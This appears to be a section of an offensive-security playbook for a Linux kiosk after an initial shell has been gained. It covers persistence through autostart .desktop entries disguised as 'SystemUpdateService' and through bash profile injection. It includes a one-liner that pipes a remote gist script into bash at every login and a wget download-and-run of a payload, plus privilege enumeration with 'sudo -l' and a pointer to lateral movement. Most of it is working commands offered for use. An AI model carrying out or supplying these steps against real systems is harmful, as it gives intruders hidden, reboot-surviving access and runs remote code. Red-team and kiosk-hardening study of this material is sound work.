Here is what to do after the initial shell is achieved. This focuses on persistence, basic situation awareness, and handing off to the post-exploitation playbook.

---

# Next Steps: Persistence & Enumeration

## Overview

At this stage you have a shell spawned by a helper application (file manager, mail client, or similar). You are still operating as the logged-in kiosk user. The immediate goal is to survive a reboot and gather enough context to plan escalation or lateral movement.

## 1. Establishing Persistence

### Method A: Autostart Directory (Recommended)

Most Linux desktop environments read `~/.config/autostart/` on login. This is commonly how the kiosk launcher itself is invoked.

1. Navigate to the directory:

```bash
cd ~/.config/autostart/

```

2. Create a persistence entry (e.g., `system-update.desktop`).

3. Payload example (generic echo):

```ini
[Desktop Entry]
Type=Application
Name=SystemUpdateService
Exec=bash -c "echo 'hello world! changeme' > ~/pwned.txt"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true

```

Nuance from the walkthrough: you will often see an existing `kiosk-demo.desktop` entry. You can modify that file to break the kiosk on next boot, or add your own alongside it to run silently in the background.

### Method B: Bash Profile Injection

If the kiosk user has a standard shell, `~/.bash_profile` (or `~/.bashrc`) runs on shell startup.

```bash
# Append a background task to the profile
echo "nohup /path/to/your/payload.sh &" >> ~/.bash_profile

```

If login shells are not used, target `~/.bashrc` instead.

### Full Background Launch Example (Walkthrough)

The walkthrough used the following end-to-end example to run in the background and register an autostart entry:

```bash
echo -e '#!/bin/bash\nsleep 10\nexport DISPLAY=:0\ndbus-launch gnome-terminal -- bash -c "curl -sL https://gist.githubusercontent.com/christian-taillon/25b217bdf409abc751747878bc62c498/raw/ctrlescapepayload.sh | bash; exec bash"' > ~/launch_demo.sh && chmod +x ~/launch_demo.sh && mkdir -p ~/.config/autostart && echo -e "[Desktop Entry]\nType=Application\nName=KioskDemo\nExec=$HOME/launch_demo.sh\nX-GNOME-Autostart-enabled=true" > ~/.config/autostart/kiosk-demo.desktop

```

Replace the URL and command with your own payloads as needed.

---

## 2. Enumeration & Situation Awareness

You may still be inside a Snap or Flatpak container depending on the application that spawned the shell.

### Check Your Context

```bash
# Container hints
env | grep SNAP
env | grep FLATPAK

# User privileges
sudo -l

```

### Moving Files

You can pull down additional tooling over the kiosk's network connection:

```bash
wget https://example.com/payload.sh -O /tmp/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh

```

---

## 3. Moving to Network (Lateral Movement)

Once persistence is set, shift focus to internal discovery and credential access. See `3 - Post-Exploitation - Moving from Kiosk to Domain and-or Network/README.md` for details.
